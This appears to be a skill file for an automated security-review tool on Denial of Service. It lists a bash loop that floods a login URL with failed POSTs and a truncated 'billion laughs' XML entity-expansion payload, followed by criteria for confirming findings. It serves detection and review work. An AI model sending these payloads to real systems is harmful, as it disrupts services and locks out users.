# Denial of Service — @overload skill
> cats: (advisory — no static taint rule yet) · severity: medium
> sources: PayloadsAllTheThings, HackTricks

## What it is
Here are some examples of Denial of Service (DoS) attacks. These examples should serve as a reference for understanding the concept, but any DoS testing should be conducted cautiously, as it can disrupt the target environment and potentially result in loss of access or exposure of sensitive data.

## Exploit payloads (from PayloadsAllTheThings)
- `for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done`
- `<?xml version="1.0"?>`
- `<!DOCTYPE lolz [`
- `<!ENTITY lol "lol">`
- `<!ELEMENT lolz (#PCDATA)>`
- `<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">`
- `<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">`
- `<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Denial%20of%20Service
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=Denial%20of%20Service
- HackTricks Cloud: https://cloud.hacktricks.wiki/
